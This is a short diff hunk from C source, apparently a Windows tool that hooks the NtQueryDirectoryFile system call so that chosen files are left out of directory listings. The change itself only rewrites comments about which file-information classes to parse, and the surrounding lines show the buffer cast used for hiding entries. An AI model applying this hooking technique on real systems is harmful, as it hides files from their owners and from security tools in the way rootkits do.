@@ -51,8 +51,8 @@ NTSTATUS DetourNtQueryDirectoryFile(
 			}
 		}
 
-		// if the requested class is one of [1, 2, 3, 12, 37, 38, 50, 60, 63] cast the buffer pointer to the appropriate structure pointer and read it
-		// TODO
+		// if the requested class is 37 (or possibly one of [1, 2, 3, 12, 37, 38, 50, 60, 63]?? - check if hiding does not work)
+		// cast the buffer pointer to the appropriate structure pointer and read it
 		if (FileInformationClass == 37) {
 			PFILE_ID_BOTH_DIR_INFORMATION FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
 			PFILE_ID_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
